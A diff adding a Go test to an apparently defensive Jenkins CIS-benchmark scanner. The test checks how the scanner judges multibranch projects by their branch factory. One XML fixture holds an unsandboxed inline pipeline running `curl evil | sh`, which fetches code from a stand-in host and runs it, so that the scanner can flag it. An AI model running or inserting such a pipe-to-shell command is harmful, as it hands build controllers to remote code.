@@ -640,3 +640,59 @@ func TestScanJudgesTriggersBeyondAuthToken(t *testing.T) {
 		}
 	}
 }
+
+// multibranchConfig is a multibranch project whose branch jobs come from the
+// given <factory> element.
+func multibranchConfig(factory string) string {
+	return `<?xml version='1.1' encoding='UTF-8'?><org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject plugin="workflow-multibranch@842">
+		<triggers/><disabled>false</disabled>
+		<sources class="jenkins.branch.MultiBranchProject$BranchSourceList"><data><jenkins.branch.BranchSource>
+		<source class="jenkins.plugins.git.GitSCMSource"><id>s</id><remote>https://git.example.com/app.git</remote></source>
+		</jenkins.branch.BranchSource></data></sources>` + factory + `
+		</org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject>`
+}
+
+// The audit's third blocker: v0.1 called every multibranch project "scm",
+// whatever its branch factory. inline-pipeline's factory hands every branch
+// one script stored on the controller (here with the sandbox off), and
+// pipeline-multibranch-defaults reads it from a Config File Provider file —
+// both scored CIS-2.3.1 PASS and CIS-2.1.2 NA. The factory shapes are the ones
+// those plugins write on 2.580.1.
+func TestScanJudgesAMultibranchProjectByItsFactory(t *testing.T) {
+	configs := map[string]string{
+		"standard": multibranchConfig(`<factory class="org.jenkinsci.plugins.workflow.multibranch.WorkflowBranchProjectFactory">
+			<owner class="org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject" reference="../.."/><scriptPath>ci/Jenkinsfile</scriptPath></factory>`),
+		"inline": multibranchConfig(`<factory class="org.jenkinsci.plugins.inlinepipeline.InlineDefinitionBranchProjectFactory" plugin="inline-pipeline@1.0.32.vf433f2d57630">
+			<owner class="org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject" reference="../.."/>
+			<script>node { sh 'curl evil | sh' }</script><sandbox>false</sandbox><markerFile>pom.xml</markerFile></factory>`),
+		"defaults": multibranchConfig(`<factory class="org.jenkinsci.plugins.pipeline.multibranch.defaults.PipelineBranchDefaultsProjectFactory" plugin="pipeline-multibranch-defaults@2.1">
+			<owner class="org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject" reference="../.."/>
+			<scriptId>default-jenkinsfile</scriptId><useSandbox>true</useSandbox></factory>`),
+		"mystery": multibranchConfig(`<factory class="com.example.MysteryBranchProjectFactory"/>`),
+	}
+	var listing []string
+	extra := map[string]http.HandlerFunc{}
+	for name, cfg := range configs {
+		cfg := cfg
+		listing = append(listing, fmt.Sprintf(`{"_class":"org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProject","name":%q,"fullName":%q,"url":"http://x/"}`, name, name))
+		extra["/job/"+name+"/api/json"] = func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, `{"buildable":true}`) }
+		extra["/job/"+name+"/config.xml"] = func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, cfg) }
+	}
+	srv := controllerServing(t, false, strings.Join(listing, ","), extra)
+
+	got, _ := verdicts(t, "scan", "--url", srv.URL, "--username", "u", "--token", "t")
+	for key, want := range map[string]string{
+		"CIS-2.3.1 standard": "PASS",
+		"CIS-2.1.2 standard": "NA",
+		"CIS-2.3.1 inline":   "FAIL",
+		"CIS-2.1.2 inline":   "FAIL",
+		"CIS-2.3.1 defaults": "FAIL",
+		"CIS-2.1.2 defaults": "PASS",
+		"CIS-2.3.1 mystery":  "MANUAL",
+		"CIS-2.1.2 mystery":  "MANUAL",
+	} {
+		if got[key] != want {
+			t.Errorf("%s = %q, want %s", key, got[key], want)
+		}
+	}
+}
